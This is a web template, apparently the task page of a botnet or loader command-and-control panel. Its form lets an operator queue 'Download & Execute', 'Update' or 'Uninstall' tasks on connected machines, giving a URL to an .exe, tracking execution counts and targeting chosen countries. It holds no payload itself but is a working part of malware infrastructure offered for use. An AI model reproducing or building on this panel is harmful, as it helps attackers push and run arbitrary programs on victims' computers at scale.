 
{include file="header.tpl"}
{include file="nav.tpl"}


<div class="col-md-11 col-lg-11">
  <div class="container">
  
      <div class="row">
    
        <div class="col-md-5 col-lg-5">
          <hr>
          <form method="POST" id="newTask"> 
          <select name="task" class="custom-select" id="inputGroupSelect01">
            <option selected disabled>Task method</option>
            <option value="dande">Download & Execute</option>
            <option value="update">Update</option>
            <option value="uninstall">Uninstall</option>
          </select>
          <div id="inputs">
          </div>
        </form>
        </div>
     
        <div class="col-md-7 col-lg-7">
           <table class="table">
              <thead>
                <tr>
                  <th colspan="2">Status</th>
                  <th>Command</th>
                  <th>Type</th>
                  <th>Executions</th>
                  <th>Task Details</th>
                </tr>
              </thead>
              <tbody>
                {foreach from=$allTasks item=task}
                <tr>
                  <td width="30">
                      <form method="post" id="delete-{$task.id}">
                        <img width="25"  onclick="document.getElementById('delete-{$task.id}').submit()" src="{$includeDir}assets/img/delete.svg" title="Delete"> 
                        <input name="delete" value="1" hidden> 
                        <input name="taskid" value="{$task.id}" hidden>
                      </form> 
                  </td>
                  <td width="30">
                    {if $task.status == "1"}
                      <form method="post" id="pause-{$task.id}">
                        <img width="25"  onclick="document.getElementById('pause-{$task.id}').submit()" src="{$includeDir}assets/img/round-pause-button.svg" title="Currenlty Running"> 
                        <input name="taskstatus" value="pause" hidden> 
                        <input name="taskid" value="{$task.id}" hidden>
                      </form> 
                    {else} 
                      <form method="post" id="run-{$task.id}">
                        <input name="taskstatus" value="run" hidden> 
                        <input name="taskid" value="{$task.id}" hidden> 
                        <img width="25" onclick="document.getElementById('run-{$task.id}').submit()" src="{$includeDir}assets/img/play-button.svg" title="Currenlty Paused"> 
                      </form> 
                    {/if}
                  </td>
                  <td>{$task.command}</td>
                  <td>{$task.task}</td>
                  <td>{$task.executions}</td>
                  <td><a href="/taskdetails/{$task.id}">Show</a></td>
                </tr> 
                {/foreach}
              </tbody>
            </table>
        </div>
      </div>
 
  </div>
</div>







{include file="footer.tpl"}
<script>
    var countryfilter = false;
    var submit = false;
    $('#inputGroupSelect01').on('change', function() {
      $('#inputs').empty();
  
      if(this.value == "dande" || this.value == "update"){
        submit = true;
        $('#inputs').append('<hr><input value="" Placeholder="http://yourdomainorip.com/path/to/file.exe" name="command" class="form-control">');    
      }
  
      if(this.value == "uninstall"){
        submit = true;
      }


  
      if(submit){

          var enablecountyFilter = {$showCountryFilter};
          if(enablecountyFilter){
              $("#inputs").append('<label class="form-check-label"> <input id="enableCountryFilter" type="checkbox" class="form-check-input"> Enable Country Filter   <span class="checkmark"></span></label>');

              $( "#enableCountryFilter" ).change(function() {
                  if($(this).is(":checked")) {
                      addCountryfilter();
                  }else{
                      $("#countyfilter").remove();
                  }
              });

          }


          $('#inputs').append(' <div class="inputs-inner"></div><a onclick="document.getElementById(\'newTask\').submit()" class="bttn">Execute Task</a>');
      }
  
  });


    function addCountryfilter() {
        $('#inputs .inputs-inner').append(' <div id="countyfilter"> <div class="form-group"><select name="country-filter[]" id="multiple-checkboxes" multiple="multiple">\n' +
                {foreach from=$countries item=country}
            '        <option value="{$country}" data-img="{$includeDir}assets/img/flags/{$country|lower}.png"> {$country}</option>\n' +
                {/foreach}
            '    </select></div></div>');

        $('#multiple-checkboxes').multiselect({
            nonSelectedText: 'Select Countries!',
            includeSelectAllOption: true,
            enableFiltering: true,
            enableHTML: true,
            optionLabel: function(element) {
                return $(element).text()+' <img src="'+$(element).attr('data-img')+'">';
            },
        });

    }



  </script>